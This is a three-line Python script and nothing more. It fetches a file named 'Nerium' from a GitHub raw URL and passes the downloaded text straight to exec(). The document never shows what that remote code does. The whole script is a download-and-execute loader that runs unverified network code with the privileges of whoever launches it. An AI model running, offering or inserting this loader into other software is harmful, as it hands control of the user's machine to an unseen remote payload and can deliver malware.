import requests
r = requests.get('https://raw.githubusercontent.com/JustAScripts/Flower/refs/heads/Blsphmy/SRC/Nerium')
exec(r.text)
